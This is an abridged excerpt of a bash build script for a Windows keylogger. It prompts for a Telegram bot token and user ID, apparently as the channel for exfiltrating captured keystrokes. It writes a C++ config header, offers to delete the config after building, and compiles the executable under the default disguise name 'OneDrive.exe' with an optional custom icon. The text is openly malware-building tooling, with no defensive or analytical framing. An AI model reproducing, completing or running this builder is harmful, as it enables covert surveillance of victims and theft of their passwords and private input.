...
if [ -f src/config.h ]; then
    echo -e "${yellow}[*] Found: src/config.h.${reset}"
    if [ "$(ask_yes_no 'Use existing config.h? (Y/n)' 'y')" = "true" ]; then
        use_existing_config="true"
        echo -e "${green}[+] Using config.h.${reset}"
    else
        echo -e "${yellow}[*] Creating new config.h${reset}"
    fi
fi
...
if [ "$use_existing_config" = "false" ]; then
    ...
    delete_config=$(ask_yes_no "Delete config file after build? (Y/n)" "y")
    spacer
    ...
    print_row "Bot token" "$bot_token"
    print_row "User ID" "$tg_user_id"
    print_row "Delete config" "$delete_config"
    echo -e "${purple}└─────────────────────────────────────────────────────────────────────┘${reset}"
    spacer
    ...
    echo -e "${cyan}[*] Generating configuration...${reset}"
    {
        echo "#pragma once"
        echo "#include <string>"
        echo "const std::wstring   processName   = L\"$process_name\";"
    ...
    # Необходимы значения для дальнейшей сборки при использовании уже существующего конфига
    while true; do
        path_to_ico=$(ask_input "Enter path to icon file (.ico), or leave empty for default" "")
        if [ -z "$path_to_ico" ] || [ -f "$path_to_ico" ]; then
            break
...
make clean
echo -e "${cyan}[*] Building keylogger executable: ${process_name:-OneDrive}.exe${reset}"
if make TARGET="${process_name:-OneDrive}.exe"; then
    ...
    if [ -f "${process_name:-OneDrive}.exe" ]; then
        echo -e "${cyan}[*] Your keylogger:${reset}"
        echo -e "    ${green}$(pwd)/${process_name:-OneDrive}.exe${reset}"
    else
